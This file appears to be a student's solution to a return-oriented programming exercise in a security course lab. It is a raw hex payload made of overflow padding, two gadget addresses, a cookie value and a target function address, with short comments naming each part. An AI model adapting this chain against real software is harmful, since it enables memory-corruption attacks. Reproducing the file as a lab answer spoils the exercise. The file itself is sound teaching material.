@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //Overflow: 24
+43 17 40 00 00 00 00 00 //Gadget 1: Address of command 58 (popq %rax). Added offset of 3
+7c 74 93 1b 00 00 00 00 //Cookie
+48 17 40 00 00 00 00 00 //Gadget 2: Address of command 48 89 c7 c3 (mov %rax into %rdi). Added offset of 2
+86 15 40 00 00 00 00 00 //Address of touch2
